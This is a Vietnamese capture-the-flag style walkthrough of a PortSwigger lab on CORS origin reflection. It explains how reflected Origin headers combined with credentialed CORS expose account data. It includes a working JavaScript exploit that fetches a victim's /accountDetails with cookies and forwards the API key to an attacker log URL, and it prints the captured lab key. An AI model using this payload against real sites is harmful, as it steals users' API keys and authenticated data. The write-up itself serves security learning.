# Vulnerabilities arising from CORS configuration issues

Nhiều trang web hiện đại sử dụng CORS để cho phép truy cập từ các tên miền phụ và các bên thứ ba đáng tin cậy. Tuy nhiên, việc triển khai CORS có thể mắc lỗi hoặc được cấu hình quá lỏng lẻo nhằm đảm bảo mọi thứ hoạt động trơn tru, và điều này có thể dẫn đến các lỗ hổng có thể bị khai thác.

# Lab: CORS vulnerability with basic origin reflection

![img](0)

Truy cập lab: 

![img](1)

Đăng nhập vào tài khoản wiener: 

![img](2)

Kiểm tra trong Burp HTTP history, tìm request AJAX gửi đến /accountDetails để lấy API key.

![img](3)

Response của request này: 

![img](4)

=> Response từ server chứa tiêu đề **Access-Control-Allow-Credentials: true**, nghĩa là nó hỗ trợ CORS với thông tin xác thực.

CORS thường cho phép các trang web chia sẻ tài nguyên giữa các miền khác nhau.

Khi Access-Control-Allow-Credentials: true xuất hiện, trình duyệt sẽ gửi cookie của người dùng khi thực hiện request chéo miền.

Nếu Access-Control-Allow-Origin có thể phản hồi lại với giá trị do attacker kiểm soát, thì hệ thống có thể bị khai thác.

Gửi request /accountDetails đến Burp Repeater và sửa tiêu đề để thêm: 

    Origin: https://example.com

![img](5)

Send request, quan sát response: 

![img](6)

=>  server phản hồi với header: 

    Access-Control-Allow-Origin: https://example.com

=>  server không kiểm soát chặt chẽ nguồn gốc (Origin) mà nó cho phép truy cập. Có nghĩa là server chấp nhận bất kỳ trang web nào làm nguồn hợp lệ.

Payload để nhập vào Exploit server:

    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://0ab200e5042e09988298dded00ff0044.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location = '/log?key=' + this.responseText;
        };
    </script>

![img](7)


- **withCredentials = true** đảm bảo rằng trình duyệt gửi cookie xác thực của nạn nhân.

- Nếu server có cấu hình CORS không an toàn, nó sẽ trả về API key cho trang web độc hại.

- **location='/log?key='+this.responseText;** tự động chuyển hướng trình duyệt đến trang log của attacker với API key bị đánh cắp.

Deliver attack to victim và quan sát Access log: 

![img](8)

=> Tìm ra API key của nạn nhân là y4HpPTYTr5eYNK0mwl1sJfEFnbIahDk6. Submit API key và solved bài lab.

![img](9)



